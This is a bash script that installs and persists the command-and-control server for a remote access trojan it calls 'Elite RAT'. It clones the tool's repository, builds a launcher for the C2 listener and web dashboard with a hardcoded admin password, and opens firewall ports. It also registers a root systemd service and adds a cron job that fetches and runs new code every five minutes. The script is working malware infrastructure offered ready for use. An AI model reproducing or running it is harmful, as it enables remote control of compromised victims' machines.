#!/bin/bash
###############################################################################
# FlipperFlipper - Quick Manual Deployment Script
# This script walks you through each step with explanations
# Run with: bash QUICK_DEPLOY.sh
###############################################################################

set -e

# Colors
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

INSTALL_DIR="/opt/elite_rat"
REPO_URL="https://github.com/oranolio956/flipperflipper.git"

echo -e "${BLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║   FlipperFlipper C2 Server - Manual Deployment Script    ║${NC}"
echo -e "${BLUE}╚═══════════════════════════════════════════════════════════╝${NC}"
echo ""

# Check if root
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[!] This script must be run as root${NC}"
   echo "Run: sudo bash $0"
   exit 1
fi

# Step 1: Update System
echo -e "${GREEN}[Step 1/12]${NC} Updating system packages..."
echo -e "${YELLOW}Command: apt-get update${NC}"
apt-get update -qq
echo -e "${GREEN}✓ System updated${NC}"
echo ""

# Step 2: Install Dependencies
echo -e "${GREEN}[Step 2/12]${NC} Installing system dependencies..."
echo -e "${YELLOW}Installing: python3, pip, git, openssl, build tools, etc.${NC}"
apt-get install -y -qq \
    python3 \
    python3-pip \
    python3-venv \
    python3-dev \
    git \
    openssl \
    screen \
    tmux \
    curl \
    wget \
    net-tools \
    build-essential \
    libssl-dev \
    libffi-dev \
    ufw
echo -e "${GREEN}✓ Dependencies installed${NC}"
echo ""

# Step 3: Clone Repository
echo -e "${GREEN}[Step 3/12]${NC} Cloning repository from GitHub..."
echo -e "${YELLOW}Command: git clone $REPO_URL $INSTALL_DIR${NC}"

if [ -d "$INSTALL_DIR" ]; then
    echo -e "${YELLOW}Directory exists - pulling latest changes instead${NC}"
    cd $INSTALL_DIR
    git pull origin main -q
else
    git clone -q $REPO_URL $INSTALL_DIR
fi

cd $INSTALL_DIR
echo -e "${GREEN}✓ Repository ready${NC}"
echo ""

# Step 4: Create Virtual Environment
echo -e "${GREEN}[Step 4/12]${NC} Creating Python virtual environment..."
echo -e "${YELLOW}Command: python3 -m venv venv${NC}"

if [ ! -d "venv" ]; then
    python3 -m venv venv
fi

source venv/bin/activate
echo -e "${GREEN}✓ Virtual environment created and activated${NC}"
echo ""

# Step 5: Upgrade Pip
echo -e "${GREEN}[Step 5/12]${NC} Upgrading pip..."
echo -e "${YELLOW}Command: pip install --upgrade pip${NC}"
pip install --upgrade pip -q
echo -e "${GREEN}✓ Pip upgraded${NC}"
echo ""

# Step 6: Install Python Packages
echo -e "${GREEN}[Step 6/12]${NC} Installing Python dependencies..."
echo -e "${YELLOW}Installing: flask, cryptography, socketio, etc.${NC}"

if [ -f "requirements.txt" ]; then
    pip install -q -r requirements.txt
else
    pip install -q flask flask-socketio flask-cors cryptography pyyaml pyjwt pillow dnspython psutil requests python-engineio python-socketio python-dotenv colorama
fi

echo -e "${GREEN}✓ Python packages installed${NC}"
echo ""

# Step 7: Generate SSL Certificates
echo -e "${GREEN}[Step 7/12]${NC} Generating SSL certificates..."
echo -e "${YELLOW}Command: openssl req -x509 -newkey rsa:4096...${NC}"

mkdir -p certs

if [ ! -f "certs/server.crt" ]; then
    openssl req -x509 -newkey rsa:4096 -nodes \
        -out certs/server.crt \
        -keyout certs/server.key \
        -days 365 \
        -subj "/C=US/ST=State/L=City/O=FlipperFlipper/CN=$(curl -s ifconfig.me)" \
        2>/dev/null
    
    chmod 600 certs/server.key
    echo -e "${GREEN}✓ SSL certificates generated${NC}"
else
    echo -e "${YELLOW}Certificates already exist - skipping${NC}"
fi
echo ""

# Step 8: Create Startup Script
echo -e "${GREEN}[Step 8/12]${NC} Creating startup script..."

cat > start_server.py << 'EOFPYTHON'
#!/usr/bin/env python3
import os
import sys
import time
import threading

sys.path.insert(0, '/opt/elite_rat')

os.environ['STITCH_ADMIN_USER'] = 'admin'
os.environ['STITCH_ADMIN_PASSWORD'] = 'EliteC2Password123!'
os.environ['ELITE_C2_HOST'] = '0.0.0.0'
os.environ['ELITE_C2_PORT'] = '5555'
os.environ['ELITE_WEB_PORT'] = '5000'

def start_c2_server():
    try:
        from Core.c2_server import SecureC2Server
        server = SecureC2Server(
            host='0.0.0.0',
            port=5555,
            use_ssl=True,
            cert_file='/opt/elite_rat/certs/server.crt',
            key_file='/opt/elite_rat/certs/server.key'
        )
        print("[+] C2 Server starting on port 5555...")
        server.start()
    except Exception as e:
        print(f"[-] C2 Server error: {e}")

def start_web_server():
    try:
        from Core.web_api import app, init_app
        init_app()
        print("[+] Web interface starting on port 5000...")
        app.run(
            host='0.0.0.0',
            port=5000,
            ssl_context=('/opt/elite_rat/certs/server.crt', 
                        '/opt/elite_rat/certs/server.key'),
            debug=False,
            threaded=True
        )
    except Exception as e:
        print(f"[-] Web server error: {e}")

if __name__ == '__main__':
    print("=" * 60)
    print("ELITE RAT C2 SERVER")
    print("=" * 60)
    c2_thread = threading.Thread(target=start_c2_server, daemon=True)
    c2_thread.start()
    time.sleep(2)
    start_web_server()
EOFPYTHON

chmod +x start_server.py
echo -e "${GREEN}✓ Startup script created${NC}"
echo ""

# Step 9: Configure Firewall
echo -e "${GREEN}[Step 9/12]${NC} Configuring firewall..."
echo -e "${YELLOW}Opening ports: 22 (SSH), 5000 (Web), 5555 (C2)${NC}"

ufw allow 22/tcp comment 'SSH' >/dev/null 2>&1
ufw allow 5000/tcp comment 'Elite RAT Web' >/dev/null 2>&1
ufw allow 5555/tcp comment 'Elite RAT C2' >/dev/null 2>&1
ufw --force enable >/dev/null 2>&1

echo -e "${GREEN}✓ Firewall configured${NC}"
echo ""

# Step 10: Create Systemd Service
echo -e "${GREEN}[Step 10/12]${NC} Creating systemd service..."

cat > /etc/systemd/system/elite_rat.service << 'EOFSERVICE'
[Unit]
Description=Elite RAT C2 Server
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/elite_rat
Environment="PATH=/opt/elite_rat/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
ExecStart=/opt/elite_rat/venv/bin/python /opt/elite_rat/start_server.py
Restart=always
RestartSec=10
StandardOutput=append:/var/log/elite_rat.log
StandardError=append:/var/log/elite_rat_error.log

[Install]
WantedBy=multi-user.target
EOFSERVICE

systemctl daemon-reload
echo -e "${GREEN}✓ Systemd service created${NC}"
echo ""

# Step 11: Create Auto-Update Script
echo -e "${GREEN}[Step 11/12]${NC} Creating auto-update script..."

cat > auto_update.sh << 'EOFUPDATE'
#!/bin/bash
INSTALL_DIR="/opt/elite_rat"
SERVICE_NAME="elite_rat"
LOG_FILE="/var/log/elite_rat_update.log"

cd $INSTALL_DIR
git fetch origin main >/dev/null 2>&1

LOCAL=$(git rev-parse HEAD)
REMOTE=$(git rev-parse origin/main)

if [ "$LOCAL" != "$REMOTE" ]; then
    echo "[$(date)] Update detected - applying..." | tee -a $LOG_FILE
    systemctl stop $SERVICE_NAME
    git pull origin main
    source venv/bin/activate
    pip install -q --upgrade -r requirements.txt 2>/dev/null || true
    systemctl start $SERVICE_NAME
    echo "[$(date)] Update complete" | tee -a $LOG_FILE
else
    echo "[$(date)] No updates available" >> $LOG_FILE
fi
EOFUPDATE

chmod +x auto_update.sh

# Add to crontab
(crontab -l 2>/dev/null | grep -v auto_update.sh; echo "*/5 * * * * $INSTALL_DIR/auto_update.sh") | crontab -

echo -e "${GREEN}✓ Auto-update configured (runs every 5 minutes)${NC}"
echo ""

# Step 12: Start Service
echo -e "${GREEN}[Step 12/12]${NC} Starting Elite RAT service..."
systemctl enable elite_rat >/dev/null 2>&1
systemctl start elite_rat

sleep 3

if systemctl is-active --quiet elite_rat; then
    echo -e "${GREEN}✓ Service started successfully${NC}"
else
    echo -e "${RED}[!] Service failed to start - check logs: journalctl -u elite_rat${NC}"
fi
echo ""

# Get public IP
PUBLIC_IP=$(curl -s ifconfig.me)

# Display completion message
echo ""
echo -e "${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║              DEPLOYMENT COMPLETE! 🎉                      ║${NC}"
echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${BLUE}═══ Access Information ═══${NC}"
echo -e "${YELLOW}Web Dashboard:${NC} https://$PUBLIC_IP:5000"
echo -e "${YELLOW}C2 Server:${NC} $PUBLIC_IP:5555"
echo ""
echo -e "${BLUE}═══ Default Credentials ═══${NC}"
echo -e "${YELLOW}Username:${NC} admin"
echo -e "${YELLOW}Password:${NC} EliteC2Password123!"
echo -e "${RED}⚠️  CHANGE PASSWORD IMMEDIATELY!${NC}"
echo ""
echo -e "${BLUE}═══ Useful Commands ═══${NC}"
echo -e "Service status:   ${GREEN}systemctl status elite_rat${NC}"
echo -e "View logs:        ${GREEN}journalctl -u elite_rat -f${NC}"
echo -e "Restart service:  ${GREEN}systemctl restart elite_rat${NC}"
echo -e "Manual update:    ${GREEN}$INSTALL_DIR/auto_update.sh${NC}"
echo ""
echo -e "${BLUE}═══ Features ═══${NC}"
echo -e "✓ Auto-starts on boot"
echo -e "✓ Auto-restarts on crash"
echo -e "✓ Auto-updates from GitHub every 5 minutes"
echo -e "✓ Firewall configured"
echo -e "✓ SSL/TLS encryption enabled"
echo ""
echo -e "${YELLOW}📖 Full documentation: $INSTALL_DIR/MANUAL_DEPLOYMENT_GUIDE.md${NC}"
echo ""
